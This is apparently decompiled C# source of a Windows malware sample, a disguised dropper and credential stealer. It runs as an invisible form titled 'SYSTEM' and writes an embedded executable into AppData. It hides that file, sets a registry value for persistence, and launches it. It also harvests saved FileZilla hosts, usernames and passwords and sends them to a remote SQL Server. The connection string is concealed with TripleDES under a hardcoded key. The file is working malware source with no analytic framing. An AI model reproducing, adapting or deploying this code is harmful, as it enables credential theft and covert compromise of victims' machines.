using System;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using d6e0c90e32d940eabae61fba2d83906f.My;
using d6e0c90e32d940eabae61fba2d83906f.My.Resources;

namespace d6e0c90e32d940eabae61fba2d83906f;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	private string string_0;

	private const string string_1 = "12/03/2015 - OUVINDO FANATISMO DO FAGNER";

	private string string_2;

	private string string_3;

	private string string1;

	private string string2;

	public string string_4;

	public SqlConnection sqlConnection_0;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	public Form1()
	{
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string_3 = Path.GetTempPath();
		string_4 = smethod_0("FsMBhPU+g4qb01IPGxhkotAa5D+Nig6MZC7ck1c6vea26AuUDYAYfudI7g5eu9IqFHTMrmTR+3SHW1XFe/XR3i/Wvx7P0szf7Bu2qwwst8D2MyyPcoa7xt8oa4pPIUhYQ8sylmnhM1MNby6MGoJ7ZQ==");
		sqlConnection_0 = new SqlConnection(string_4);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		TextBox1 = new TextBox();
		Label1 = new Label();
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(44, 68);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(47, 31);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Label1");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.White);
		size = new Size(0, 0);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("SYSTEM");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public byte[] method_0(byte[] x, byte[] y)
	{
		byte[] array = new byte[checked(x.Length + y.Length - 1 + 1)];
		x.CopyTo(array, 0);
		y.CopyTo(array, x.Length);
		return array;
	}

	public static string smethod_0(string Message)
	{
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] key = mD5CryptoServiceProvider.ComputeHash(uTF8Encoding.GetBytes("12/03/2015 - OUVINDO FANATISMO DO FAGNER"));
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = key;
		tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
		tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		byte[] array = Convert.FromBase64String(Message);
		byte[] bytes;
		try
		{
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
			bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		}
		finally
		{
			tripleDESCryptoServiceProvider.Clear();
			mD5CryptoServiceProvider.Clear();
		}
		return uTF8Encoding.GetString(bytes);
	}

	public string RandomString(int length)
	{
		Random random = new Random();
		checked
		{
			char[] array = new char[length - 1 + 1];
			int num = length - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = random.Next(65, 101);
				if (num2 > 90)
				{
					num2 -= 43;
				}
				array[i] = Convert.ToChar(num2);
			}
			return new string(array);
		}
	}

	public object method_1()
	{
		object result = default(object);
		try
		{
			string text = Interaction.Environ("appdata") + "\\FileZilla\\recentservers.xml";
			string text2 = Conversions.ToString(1);
			text2 = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileReader(text).ReadToEnd();
			string text3 = null;
			string[] array = text2.Split(new char[1] { '\r' });
			text2 = null;
			string[] array2 = array;
			foreach (string text4 in array2)
			{
				if (text4.Contains("Host"))
				{
					text3 = text3 + text4 + "\r\n";
				}
				if (text4.Contains("Port"))
				{
					text3 = text3 + text4 + "\r\n";
				}
				if (text4.Contains("Protocol"))
				{
					text3 = text3 + text4 + "\r\n";
				}
				if (text4.Contains("User"))
				{
					text3 = text3 + text4 + "\r\n";
				}
				if (text4.Contains("Pass"))
				{
					text3 = text3 + text4 + "\r\n\r\n";
				}
			}
			result = text3;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_01a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bb: Expected O, but got Unknown
		//IL_01d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01da: Expected O, but got Unknown
		//IL_01ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		if (!File.Exists(string_0 + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + ".glp"))
		{
			try
			{
				Label1.set_Text(Conversions.ToString(((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime().Second));
				Label1.set_Text(Label1.get_Text() + "000");
				byte[] bytes = Encoding.UTF8.GetBytes(Label1.get_Text());
				byte[] terca54554455454544554 = Resources.terca54554455454544554;
				byte[] array = method_0(terca54554455454544554, bytes);
				string_2 = string_0 + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + ".exe";
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(string_2, array, false);
				((ServerComputer)MyProject.Computer).get_Registry().SetValue(smethod_0("TB1Hll07QBoxNOPIhZJt6wvaq/aGdqCGqAcV4Odbo4N7egio7pC+vc8VYrCZrUlufKSiZ6jIS9EmCHdMDj0OYw=="), ((ServerComputer)MyProject.Computer).get_Name(), (object)string_2);
				File.Create(string_0 + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + ".glp");
				FileSystem.SetAttr(string_0 + "\\" + ((ServerComputer)MyProject.Computer).get_Name() + ".glp", (FileAttribute)2);
				FileSystem.SetAttr(string_2, (FileAttribute)2);
				Interaction.Shell(string_2, (AppWinStyle)2, false, -1);
				TextBox1.set_Text(Conversions.ToString(method_1()));
				if (TextBox1.get_Text().Length > 1)
				{
					sqlConnection_0.Open();
					SqlCommand val = new SqlCommand(smethod_0("eGfTp3qjIQ1TV/+V8QqloC0UliWrF6lAPqbFL5m3uosL48/EoyGbPv3KO3mdI5kUKYZUS1TldXbYLQZmoKM7eMmPpKumCCSwz7a+Ef77dMQ="), sqlConnection_0);
					SqlParameter val2 = new SqlParameter("@nomepc", SqlDbType.NText);
					val2.set_Value((object)((ServerComputer)MyProject.Computer).get_Name());
					SqlParameter val3 = new SqlParameter("@Login", SqlDbType.NText);
					val3.set_Value((object)"ok");
					SqlParameter val4 = new SqlParameter("@ftp", SqlDbType.NText);
					val4.set_Value((object)TextBox1.get_Text());
					val.get_Parameters().Add(val2);
					val.get_Parameters().Add(val3);
					val.get_Parameters().Add(val4);
					val.ExecuteNonQuery();
					sqlConnection_0.Close();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			ProjectData.EndApp();
		}
		else
		{
			ProjectData.EndApp();
		}
	}
}
